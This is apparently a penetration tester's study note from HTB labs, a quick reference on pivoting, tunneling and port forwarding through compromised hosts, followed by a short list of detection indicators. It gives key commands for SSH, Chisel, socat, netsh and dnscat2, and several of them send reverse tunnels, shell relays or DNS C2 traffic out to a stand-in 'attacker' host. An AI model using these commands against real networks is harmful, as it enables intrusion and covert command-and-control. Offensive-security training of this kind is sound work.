# Pivoting, Tunneling & Port Forwarding - Quick Reference

## Overview
This guide covers lateral movement techniques for accessing internal networks through compromised pivot hosts. Use this when you've compromised an edge system and need to reach internal targets.

---

## Quick Technique Selection

### By Access Type
- **SSH Access to Pivot?** → [[SSH Socks Tunnel PF|SSH Dynamic SOCKS Tunnel]], [[Remote-Reverse Port Forwarding with SSH|SSH Reverse Port Forwarding]], [[SSH Pivoting with Sshuttle|Sshuttle]]
- **Windows Pivot Only?** → [[Port Forwarding with Windows- Netsh|Netsh]], [[SSH for Windows- plink.exe|Plink.exe]], [[RDP and SOCKS Tunneling with SocksOverRDP/RDP and SOCKS Tunneling with SocksOverRDP|SocksOverRDP]]
- **Meterpreter Session?** → [[Meterpreter Tunneling & Port Forwarding/Meterpreter Tunneling & Port Forwarding|Meterpreter Pivoting]]
- **No Direct Connection?** → [[DNS Tunnelling with Dnscat2|DNS Tunneling]], [[ICMP Tunneling with SOCKS|ICMP Tunneling]]
- **Minimal Tools?** → [[Socat Redirection with Bind Shell|Socat Bind]], [[Socat Redirection with a Reverse Shell|Socat Reverse]]

### By Network Restrictions
- **Firewall Blocks Inbound?** → [[SOCKS5 Tunneling with Chisel#Reverse SOCKS5 Tunneling|Chisel Reverse]], [[Remote-Reverse Port Forwarding with SSH|SSH Reverse]]
- **Only DNS Allowed?** → [[DNS Tunnelling with Dnscat2|Dnscat2]]
- **Only ICMP Allowed?** → [[ICMP Tunneling with SOCKS|ICMP Tunneling]]
- **HTTP/HTTPS Only?** → [[Web Server Pivoting with Rpivot|Rpivot]], [[SOCKS5 Tunneling with Chisel|Chisel]]

---

## Core Techniques

### SSH-Based Pivoting
1. **[[SSH Socks Tunnel PF|Dynamic SOCKS Tunnel (SSH)]]**
   - Best for: Full network access through SSH
   - Use with: proxychains
   - Key command: `ssh -D 9050 user@pivot`

2. **[[Remote-Reverse Port Forwarding with SSH|Remote/Reverse Port Forwarding (SSH)]]**
   - Best for: Specific service access, reverse connections
   - Use case: Forward pivot port to your listener
   - Key command: `ssh -R pivot:8080:0.0.0.0:8000 user@pivot`

3. **[[SSH Pivoting with Sshuttle|Sshuttle]]**
   - Best for: Transparent VPN-like access
   - Advantage: No proxychains needed
   - Key command: `sshuttle -r user@pivot 172.16.5.0/23`

### Windows Pivoting
4. **[[Port Forwarding with Windows- Netsh|Netsh Port Forwarding]]**
   - Best for: Windows pivot with admin rights
   - Built-in: No upload required
   - Key command: `netsh interface portproxy add v4tov4`

5. **[[SSH for Windows- plink.exe|Plink.exe (Windows SSH)]]**
   - Best for: SSH tunneling from Windows pivot
   - Tool: plink.exe
   - Key command: `plink.exe -ssh -D 9050 user@target`

6. **[[RDP and SOCKS Tunneling with SocksOverRDP/RDP and SOCKS Tunneling with SocksOverRDP|SocksOverRDP]]**
   - Best for: RDP access with SOCKS proxy
   - Use case: Pivot through RDP session
   - Components: SocksOverRDP-Plugin + Proxifier

### Metasploit Framework
7. **[[Meterpreter Tunneling & Port Forwarding/Meterpreter Tunneling & Port Forwarding|Meterpreter Pivoting]]**
   - Capabilities: autoroute, portfwd, SOCKS proxy
   - Best for: Metasploit-centric operations
   - Key modules: `auxiliary/server/socks_proxy`, `post/multi/manage/autoroute`

### Cross-Platform Tools
8. **[[SOCKS5 Tunneling with Chisel|Chisel]]**
   - Protocol: HTTP with SSH encryption
   - Modes: Forward and Reverse SOCKS5
   - Best for: Restricted networks (HTTP only)
   - Forward: `chisel server --socks5`
   - Reverse: `chisel server --reverse --socks5`

9. **[[Web Server Pivoting with Rpivot|Rpivot]]**
   - Protocol: HTTP/HTTPS SOCKS proxy
   - Best for: Web server pivots
   - Key command: `python server.py --proxy-port 9050 --server-port 9999`

### Covert Channels
10. **[[DNS Tunnelling with Dnscat2|DNS Tunneling (Dnscat2)]]**
    - Protocol: DNS TXT records
    - Best for: DNS-only egress
    - Use case: Bypassing strict firewalls
    - C2: `dnscat2.rb --dns host=attacker,port=53,domain=target.com`

11. **[[ICMP Tunneling with SOCKS|ICMP Tunneling]]**
    - Protocol: ICMP echo packets
    - Best for: ICMP-only egress
    - Tool: ptunnel-ng, Hans
    - Use case: Extreme firewall restrictions

### Basic Redirection
12. **[[Socat Redirection with Bind Shell|Socat Bind Shell]]**
    - Best for: Simple port redirection
    - Use case: Forward bind shell through pivot
    - Key command: `socat TCP4-LISTEN:8080 TCP4:target:80`

13. **[[Socat Redirection with a Reverse Shell|Socat Reverse Shell]]**
    - Best for: Reverse shell pivoting
    - Use case: Catch reverse shell from internal host
    - Key command: `socat TCP4-LISTEN:8080 TCP4:attacker:80`

---

## Workflow Guide

### Initial Pivot Setup
1. Identify pivot host with dual network access
2. Choose technique based on:
   - Available access (SSH/RDP/Shell)
   - Network restrictions (firewall rules)
   - Required stealth level
3. Establish tunnel/proxy
4. Configure proxychains (if needed)
5. Enumerate internal network

### Network Enumeration Through Pivot
```bash
# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

# Ping sweep
proxychains nmap -sn 172.16.5.0/24

# Port scan
proxychains nmap -sT -Pn -p- 172.16.5.10

# Service enumeration
proxychains nmap -sV -Pn -p80,443,3389 172.16.5.10
```

### Common Proxychains Configuration
```
# /etc/proxychains.conf
[ProxyList]
# SSH Dynamic Forward
socks4 127.0.0.1 9050

# Chisel
socks5 127.0.0.1 1080

# Metasploit SOCKS
socks4a 127.0.0.1 9050
```

---

## Cheat Sheet

### Port Forwarding Quick Reference
```bash
# Local Port Forward (SSH)
ssh -L local_port:target:target_port user@pivot

# Remote Port Forward (SSH)  
ssh -R pivot_port:destination:dest_port user@pivot

# Dynamic Port Forward (SSH)
ssh -D local_port user@pivot

# Meterpreter Port Forward
portfwd add -l local_port -p target_port -r target_ip

# Netsh (Windows)
netsh interface portproxy add v4tov4 listenport=local connectaddress=target connectport=target_port
```

### Tunnel Setup Commands
```bash
# Chisel Forward
chisel server --socks5 -p 1234  # On pivot
chisel client pivot:1234 socks   # On attacker

# Chisel Reverse
chisel server --reverse --socks5 -p 1234  # On attacker
chisel client attacker:1234 R:socks       # On pivot

# Sshuttle
sshuttle -r user@pivot 172.16.5.0/23 -vv

# Dnscat2
dnscat2.rb --dns host=attacker,port=53,domain=tunnel.com  # Server
Start-Dnscat2 -DNSserver attacker -Domain tunnel.com      # Client
```

---

## Defense & Detection
See: [[Defending and Detection/Defending and Detection|Defending and Detection]]

### Key Indicators
- Unusual DNS query patterns (TXT records)
- ICMP traffic with large payload sizes
- SSH connections with high data transfer
- Multiple connections to single external host
- Proxychains process name in logs
- Chisel/dnscat2 binaries

---

## Practice & Learning
[[Learning Opportunities|HTB Labs & Practice Scenarios]]

---

## Related Topics
- [[../../Lateral Movement|Lateral Movement Techniques]]
- Network Segmentation Bypass
- Firewall Evasion
- C2 Infrastructure

---

## Tags
#pivoting #tunneling #portforwarding #lateral-movement #networking #post-exploitation